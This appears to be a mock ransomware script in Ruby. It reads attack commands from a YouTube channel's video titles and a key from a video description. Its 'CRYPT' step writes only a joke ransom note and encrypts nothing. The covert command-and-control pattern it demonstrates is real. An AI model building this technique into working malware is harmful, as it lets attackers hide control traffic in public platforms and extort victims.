#!/usr/bin/ruby
#Libraries
require 'yt'
require 'colorize'

# !!! API Key Required !!!
api = ""
channel = "UCrFHwWfftOUs31_T4DBBaCA"

#Attack Routine
puts "Attempting to connect to YouTube...".light_blue
Yt.configure do |config|
    config.api_key = api
end  
puts "Searching for tainted user...".light_blue
channel = Yt::Channel.new id: channel
channel.title
puts "Found tainted user: #{channel.title}".light_red
commands = []
key = ""
puts "Recovering commands from the page...".light_yellow
channel.videos.each do |vid|
    commands.push(vid.title)
    if vid.description.include? "ssh-rsa"
        key = vid.description
    end
end
command_identifiers = ["SEQ START", "GET KEY", "LEAK INFO",  "CRYPT", "SEQ END"]
puts "Getting SEQ..."
commands.reverse.each do |command|
    if command.match?(Regexp.union(command_identifiers))
        case command
        when /SEQ START/
            puts "Received SEQ_START".light_red
        when /GET KEY/
            puts "Received Key: #{key}".light_yellow
        when /LEAK INFO/
            puts "No information to leak. Host will not be enrolled.".light_blue
        when /CRYPT/
            puts "Starting encryption cycle...".light_red
            begin
                desktop = ""
                if Dir.exist?(File.expand_path('~') + "/Desktop")
                    desktop = "#{File.expand_path('~')}/Desktop"
                elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
                    desktop = "#{File.expand_path('~')}/Escritorio"
                else
                    desktop = "/tmp"
                end
                File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
                ""
            rescue => e
                puts "Exception: #{e}"
                "Error: Failed to run supplied command."
            end
        when /SEQ END/
            puts "Received SEQ_END"
        else
            "Bad Response"
        end
    end
end